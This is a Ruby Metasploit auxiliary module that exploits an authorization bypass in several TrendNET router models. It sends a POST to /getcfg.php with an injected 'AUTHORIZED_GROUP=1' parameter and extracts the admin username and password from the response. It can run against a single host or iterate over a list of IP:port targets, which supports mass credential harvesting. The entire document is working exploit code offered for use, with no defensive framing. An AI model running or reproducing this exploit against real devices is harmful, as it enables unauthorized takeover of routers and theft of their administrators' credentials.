require 'msf/core'

class MetasploitModule < Msf::Auxiliary
   Rank = ExcellentRanking
	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'TrendNET Router authorization Bypass',
			'Description'    => %q{
				Verder Version:
                                          TEW-751DR – v1.03B03
                                          TEW-752DRU – v1.03B01
                                          TEW733GR – v1.03B01
			},
			'Author'         => [ 'myself' ],
			'License'        => MSF_LICENSE))
		register_options(
			[
				OptString.new('TARGETURI', [true, 'The target page path', '/getcfg.php']),
                                OptString.new('IPPortlistfile',[false,'The path of list file']),
                                OptString.new('RHOST',[false,'Single IP'])
			], self.class)
	end
        def check
            res = send_request_cgi({
                  'uri'     => '/',
                  'method'  => 'GET'
            })
            if res && res.headers['Server']
               auth = res.headers['Server']
               if auth.include?"TEW-751DR"
                  return Exploit::CheckCode::Appears
               end
               if auth.include?"TEW-752DRU"
                  return Exploit::CheckCode::Appears
               end
               if auth.include?"TEW-733GR"
                  return Exploit::CheckCode::Appears
               end
            end
            Exploit::CheckCode::Safe
        end
        def postDate(ip,port)
            uri = target_uri.path
            datastore['rhost'] = ip
            datastore['rport'] = port
            begin
               res = send_request_cgi({
			'method'   => 'POST',
			'uri'      => uri,
                        'data'     => 'SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1'
		      })
            rescue ::Errno::ETIMEDOUT, ::Errno::ECONNRESET, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
               return
            end
            if res && res.code == 200
		print_good("geting user and password...")
                admin = res.body.split("<name>")[1].split("</name>")[0]
                password = res.body.split("<password>")[1].split("</password>")[0]
                print_good("IP:#{ip}:username : #{admin},password : #{password}")
	    else
		print_error("IP:#{ip}:No 200, feeling blue")
	    end
        end
	def run
            singleHost = datastore['RHOST']
            print_good("#{singleHost}")
            ipListFile = datastore['IPPortlistfile']
            if !singleHost.nil? && !singleHost.empty? 
               postDate(datastore['rhost'],datastore['rport'])
            end
            if !ipListFile.nil? && !ipListFile.empty? 
               IO.foreach(ipListFile){|block| postDate(block.split(":")[0],block.split(":")[1])}
            end
	end
end
